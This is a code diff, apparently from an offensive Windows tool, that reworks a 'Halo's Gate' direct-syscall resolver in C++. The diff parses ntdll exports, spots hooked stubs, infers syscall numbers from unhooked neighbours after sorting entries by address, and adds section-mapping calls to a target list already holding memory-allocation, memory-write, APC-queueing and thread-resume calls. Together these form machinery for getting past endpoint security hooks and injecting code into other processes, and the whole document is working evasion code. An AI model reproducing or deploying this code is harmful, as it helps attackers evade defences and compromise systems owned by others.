@@ -6,7 +6,8 @@
 #define MAX_NT_EXPORTS 2048
 
 struct ntexport_entry {
-    DWORD rva;
+    DWORD name_rva;
+    DWORD func_rva;
     DWORD ordinal;
     bool is_hooked;
     uint32_t ssn;
@@ -55,7 +56,7 @@ static uint32_t extract_ssn(const uint8_t* addr) {
 
 static int find_export_index(const char* name) {
     for (DWORD i = 0; i < g_export_count; i++) {
-        char* export_name = reinterpret_cast<char*>(g_ntdll_base + g_export_buffer[i].rva);
+        char* export_name = reinterpret_cast<char*>(g_ntdll_base + g_export_buffer[i].name_rva);
         if (str_equal(export_name, name)) {
             return static_cast<int>(i);
         }
@@ -67,11 +68,11 @@ static uint32_t resolve_ssn_halos(int idx) {
     for (int d = 1; d < 100; d++) {
         int up = idx + d;
         if (up < static_cast<int>(g_export_count) && !g_export_buffer[up].is_hooked) {
-            return g_export_buffer[up].ssn - static_cast<uint32_t>(g_export_buffer[up].ordinal - g_export_buffer[idx].ordinal);
+            return g_export_buffer[up].ssn - static_cast<uint32_t>(d);
         }
         int down = idx - d;
         if (down >= 0 && !g_export_buffer[down].is_hooked) {
-            return g_export_buffer[down].ssn + static_cast<uint32_t>(g_export_buffer[idx].ordinal - g_export_buffer[down].ordinal);
+            return g_export_buffer[down].ssn + static_cast<uint32_t>(d);
         }
     }
     return 0xFFFFFFFF;
@@ -129,14 +130,13 @@ DWORD InitSyscalls() {
 
     for (DWORD i = 0; i < count; i++) {
         char* name = reinterpret_cast<char*>(g_ntdll_base + names[i]);
-        bool is_nt = (name[0] == 'N' && name[1] == 't');
-        bool is_zw = (name[0] == 'Z' && name[1] == 'w');
-        if (!is_nt && !is_zw) continue;
+        if (name[0] != 'N' || name[1] != 't') continue;
 
         DWORD rva = funcs[ordinals[i]];
         const uint8_t* stub = reinterpret_cast<const uint8_t*>(g_ntdll_base + rva);
 
-        g_export_buffer[g_export_count].rva = names[i];
+        g_export_buffer[g_export_count].name_rva = names[i];
+        g_export_buffer[g_export_count].func_rva = rva;
         g_export_buffer[g_export_count].ordinal = ordinals[i];
 
         if (is_syscall_stub(stub)) {
@@ -149,22 +149,39 @@ DWORD InitSyscalls() {
         g_export_count++;
     }
 
+    // sort by function address so adjacent entries have adjacent SSNs
+    for (DWORD i = 1; i < g_export_count; i++) {
+        ntexport_entry key = g_export_buffer[i];
+        int j = static_cast<int>(i) - 1;
+        while (j >= 0 && g_export_buffer[j].func_rva > key.func_rva) {
+            g_export_buffer[j + 1] = g_export_buffer[j];
+            j--;
+        }
+        g_export_buffer[j + 1] = key;
+    }
+
     const char* target_names[] = {
         "NtAllocateVirtualMemory",
         "NtWriteVirtualMemory",
         "NtProtectVirtualMemory",
         "NtQueueApcThread",
-        "NtResumeThread"
+        "NtResumeThread",
+        "NtCreateSection",
+        "NtMapViewOfSection",
+        "NtUnmapViewOfSection",
     };
     void* stub_addrs[] = {
         reinterpret_cast<void*>(&SysNtAllocateVirtualMemory),
         reinterpret_cast<void*>(&SysNtWriteVirtualMemory),
         reinterpret_cast<void*>(&SysNtProtectVirtualMemory),
         reinterpret_cast<void*>(&SysNtQueueApcThread),
-        reinterpret_cast<void*>(&SysNtResumeThread)
+        reinterpret_cast<void*>(&SysNtResumeThread),
+        reinterpret_cast<void*>(&SysNtCreateSection),
+        reinterpret_cast<void*>(&SysNtMapViewOfSection),
+        reinterpret_cast<void*>(&SysNtUnmapViewOfSection),
     };
 
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 8; i++) {
         int idx = find_export_index(target_names[i]);
         if (idx < 0) return FAIL_HALOS_GATE_EXPORT;
 
@@ -190,3 +207,4 @@ DWORD InitSyscalls() {
 RtlCreateProcessParametersEx_t SysGetRtlCreateProcessParametersEx() {
     return g_RtlCreateProcessParametersEx;
 }
+
